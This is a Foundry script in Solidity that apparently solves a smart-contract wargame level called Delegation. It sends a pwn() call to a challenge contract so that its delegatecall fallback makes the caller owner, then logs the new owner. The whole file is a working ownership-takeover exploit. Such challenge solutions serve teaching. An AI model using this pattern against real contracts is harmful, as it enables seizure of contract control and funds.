// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "src/6Delegation.sol";

contract DelegateAttack is Script {
    address constant CHALLENGE = 0xf25729dc4F1BDeE325EfF35De414a97f39Bb3B04;
    Delegation public delegation;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        delegation = Delegation(CHALLENGE);
        (bool success,) = address(CHALLENGE).call(abi.encodeWithSignature("pwn()"));
        if (!success) {
            revert("Call failed");
        }
        console.log(delegation.owner());
        vm.stopBroadcast();
    }
}
